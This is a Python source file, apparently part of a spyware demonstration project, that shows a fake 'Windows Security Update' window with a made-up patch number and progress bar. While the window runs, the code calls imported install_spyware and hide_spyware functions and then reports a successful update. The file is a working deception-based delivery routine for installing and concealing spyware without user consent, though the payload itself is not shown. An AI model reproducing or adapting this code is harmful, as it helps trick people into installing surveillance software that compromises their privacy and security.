"""
DELIVERY TECHNIQUE 2: DRIVE-BY DOWNLOAD
Fake "Software Update" that auto-installs spyware without user interaction

This technique demonstrates:
- Fake Windows/software update notification
- Automatic installation (no explicit consent)
- Mimics legitimate update process

Usage: python main.py (from this directory)
"""

import sys
import os
import tkinter as tk
from tkinter import ttk
import threading
import time

# Add parent directories to path
current_dir = os.path.dirname(os.path.abspath(__file__))
delivery_dir = os.path.dirname(current_dir)
malicious_dir = os.path.dirname(delivery_dir)
sys.path.insert(0, malicious_dir)

from delivery.technique2.function2_install_spyware import install_spyware
from delivery.technique2.function3_hide_spyware import hide_spyware

def show_fake_update_gui():
    """Display fake Windows update notification"""
    print("[Technique 2] Showing fake software update...")
    
    update_window = tk.Tk()
    update_window.title("Windows Security Update")
    update_window.geometry("650x400")
    update_window.resizable(False, False)
    update_window.configure(bg='#f0f0f0')
    update_window.attributes('-topmost', True)
    
    # Header with Windows logo style
    header_frame = tk.Frame(update_window, bg='#0078D7', height=80)
    header_frame.pack(fill='x')
    header_frame.pack_propagate(False)
    
    title = tk.Label(header_frame,
                    text="🪟 Windows Security Update",
                    font=("Segoe UI", 20, "bold"),
                    bg='#0078D7', fg='white')
    title.pack(pady=25)
    
    # Content
    content = tk.Frame(update_window, bg='#f0f0f0')
    content.pack(fill='both', expand=True, padx=40, pady=30)
    
    message = tk.Label(content,
                      text="Critical Security Update Available\n\n"
                           "A critical security update for your system has been detected.\n"
                           "This update includes:\n\n"
                           "• Security patch KB5034203\n"
                           "• Critical vulnerability fixes\n"
                           "• System performance improvements\n\n"
                           "Installing update...",
                      font=("Segoe UI", 11),
                      bg='#f0f0f0', fg='#333',
                      justify='left')
    message.pack(pady=20)
    
    # Progress bar
    global progress_var, status_label
    
    status_label = tk.Label(content,
                           text="Downloading update (0%)...",
                           font=("Segoe UI", 10),
                           bg='#f0f0f0', fg='#666')
    status_label.pack(pady=10)
    
    progress_var = tk.IntVar(value=0)
    progress = ttk.Progressbar(content,
                              length=500,
                              mode='determinate',
                              variable=progress_var)
    progress.pack(pady=15)
    
    info = tk.Label(content,
                   text="Please wait while the update is being installed.\n"
                        "Do not turn off your computer.",
                   font=("Segoe UI", 9),
                   bg='#f0f0f0', fg='#999')
    info.pack(pady=15)
    
    # Start installation in background
    threading.Thread(target=auto_install_spyware, args=(update_window,), daemon=True).start()
    
    return update_window

def auto_install_spyware(window):
    """Auto-install spyware while showing fake update progress"""
    
    stages = [
        (10, "Downloading update (10%)..."),
        (25, "Downloading update (25%)..."),
        (40, "Verifying package integrity..."),
        (50, "Installing security patches..."),
        (65, "Configuring system settings..."),
        (80, "Applying security updates..."),
        (95, "Finalizing installation..."),
    ]
    
    for progress, message in stages:
        progress_var.set(progress)
        status_label.config(text=message)
        window.update()
        time.sleep(0.8)
    
    # Actually install spyware here
    print("\n[Technique 2] Installing spyware during fake update...")
    
    # Function 2: Install spyware
    install_spyware()
    
    # Function 3: Hide spyware
    hide_spyware()
    
    # Complete
    progress_var.set(100)
    status_label.config(text="Update completed successfully!")
    window.update()
    time.sleep(1.5)
    
    # Show success message
    success_label = tk.Label(window,
                            text="✓ Security update installed successfully!\n"
                                 "Your system is now up to date.",
                            font=("Segoe UI", 12, "bold"),
                            bg='#f0f0f0', fg='#107C10')
    success_label.place(relx=0.5, rely=0.85, anchor='center')
    window.update()
    
    time.sleep(2)
    window.destroy()
    
    print("[Technique 2] ✓ Spyware delivered successfully via fake update!\n")

def main():
    print("="*70)
    print("DELIVERY TECHNIQUE 2: DRIVE-BY DOWNLOAD (Fake Software Update)")
    print("="*70)
    print("\nThis technique demonstrates:")
    print("- Fake Windows/software update notification")
    print("- Automatic installation without explicit user consent")
    print("- Mimics legitimate system update process")
    print("\nShowing fake update window...")
    print("(Spyware installs automatically during 'update')")
    print("="*70 + "\n")
    
    window = show_fake_update_gui()
    window.mainloop()
    
    print("\n[Technique 2] Demo complete - Spyware delivered via fake update\n")

if __name__ == "__main__":
    main()

